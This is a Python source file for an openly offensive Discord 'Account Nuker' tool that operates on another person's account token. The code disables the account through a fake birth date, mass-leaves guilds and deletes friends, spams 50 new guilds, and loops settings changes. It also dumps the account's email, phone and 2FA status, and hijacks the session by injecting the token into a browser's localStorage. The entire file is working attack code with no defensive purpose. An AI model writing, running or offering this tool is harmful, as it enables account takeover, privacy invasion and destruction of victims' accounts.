import threading
import requests
import discord
import random
import time
import os

from colorama import Fore, init
from selenium import webdriver
from datetime import datetime
from itertools import cycle

init(convert=True)
guildsIds = []
friendsIds = []
clear = lambda: os.system('cls')
clear()

class Login(discord.Client):
    async def on_connect(self):
        for g in self.guilds:
            guildsIds.append(g.id)
 
        for f in self.user.friends:
            friendsIds.append(f.id)

        await self.logout()

    def run(self, token):
        try:
            super().run(token, bot=False)
        except Exception as e:
            print(f"[{Fore.RED}-{Fore.RESET}] Invalid token", e)
            input("Press any key to exit..."); exit(0)

def tokenLogin(token):
    opts = webdriver.ChromeOptions()
    opts.add_experimental_option("detach", True)
    driver = webdriver.Chrome('chromedriver.exe', options=opts)
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script + f'\nlogin("{token}")')

def tokenInfo(token):
    headers = {'Authorization': token, 'Content-Type': 'application/json'}  
    r = requests.get('https://discord.com/api/v6/users/@me', headers=headers)
    if r.status_code == 200:
            userName = r.json()['username'] + '#' + r.json()['discriminator']
            userID = r.json()['id']
            phone = r.json()['phone']
            email = r.json()['email']
            mfa = r.json()['mfa_enabled']
            print(f'''
            [{Fore.RED}User ID{Fore.RESET}]         {userID}
            [{Fore.RED}User Name{Fore.RESET}]       {userName}
            [{Fore.RED}2 Factor{Fore.RESET}]        {mfa}

            [{Fore.RED}Email{Fore.RESET}]           {email}
            [{Fore.RED}Phone number{Fore.RESET}]    {phone if phone else ""}
            [{Fore.RED}Token{Fore.RESET}]           {token}

            ''')
            input()

def tokenFuck(token):
    headers = {'Authorization': token}
    print(f"[{Fore.RED}+{Fore.RESET}] Nuking...")

    for guild in guildsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/guilds/{guild}', headers=headers)

    for friend in friendsIds:
        requests.delete(f'https://discord.com/api/v6/users/@me/relationships/{friend}', headers=headers)

    for i in range(50):
        payload = {'name': f'JAJAJA {i}', 'region': 'europe', 'icon': None, 'channels': None}
        requests.post('https://discord.com/api/v6/guilds', headers=headers, json=payload)

    modes = cycle(["light", "dark"])
    while True:
        setting = {'theme': next(modes), 'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])}
        requests.patch("https://discord.com/api/v6/users/@me/settings", headers=headers, json=setting)

def tokenDisable(token):
    r = requests.patch('https://discordapp.com/api/v6/users/@me', headers={'Authorization': token}, json={'date_of_birth': '9999-7-16'})
    if r.status_code == 400:
        print(f'[{Fore.RED}+{Fore.RESET}] Account disabled successfully')
        input("Press any key to exit...")
    else:
        print(f'[{Fore.RED}-{Fore.RESET}] Invalid token')
        input("Press any key to exit...")

def getBanner():
    banner = f'''
                ▄▄▄██▀▀ ▄▄▄          ▄▄▄██▀▀▀ ▄▄▄          ▄▄▄██▀▀ ▄▄▄      
                  ░██  ░████▄          ░██   ░████▄          ░██  ░████▄    
                  ░██  ░██  ▀█▄        ░██   ░██  ▀█▄        ░██  ░██  ▀█▄  
               ░██▄██░ ░██▄▄▄▄██    ░██▄██░  ░██▄▄▄▄██    ░██▄██░ ░██▄▄▄▄██ 
                ░███░   ██   ██░     ░███░    ██   ░██░    ░███░   ██░  ░██░
                 ░█░░░   ░░  █░█░     ░█░░░   ░░    █░█░    ░░█░░░   ░░  █░█░
                ░ ░░░    ░   ░░ ░    ░ ░░░    ░   ░░ ░    ░ ░░░    ░   ░░ ░     {Fore.RED}({Fore.RESET}Account Nuker{Fore.RED}){Fore.RESET}
                ░ ░ ░    ░   ░       ░ ░ ░    ░   ░       ░ ░ ░    ░   ░          - MassDM removed...
                ░   ░        ░  ░    ░   ░        ░  ░    ░   ░        ░  ░       + Token info added
                                                                                  + Token login added
        
                [{Fore.RED}1{Fore.RESET}] Disable the account 
                [{Fore.RED}2{Fore.RESET}] Token fuck the account
                [{Fore.RED}3{Fore.RESET}] Grab info about the account
                [{Fore.RED}4{Fore.RESET}] Log into a token

    '''.replace('░', f'{Fore.RED}░{Fore.RESET}')
    return banner

def startMenu():
    print(getBanner())
    print(f'[{Fore.RED}>{Fore.RESET}] Your choice', end=''); choice = str(input('  :  '))
    if choice == '1':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        tokenDisable(token)

    elif choice == '2':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        print(f'[{Fore.RED}>{Fore.RESET}] Threads amount (number)', end=''); threads = input('  :  ')
        Login().run(token)
        if threading.active_count() < int(threads):
            t = threading.Thread(target=tokenFuck, args=(token, ))
            t.start()

    elif choice == '3':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        tokenInfo(token)
    
    elif choice == '4':
        print(f'[{Fore.RED}>{Fore.RESET}] Account token', end=''); token = input('  :  ')
        tokenLogin(token)

    elif choice.isdigit() == False:
        clear()
        startMenu()

    else:
        clear()
        startMenu()
        
if __name__ == '__main__':
    startMenu()
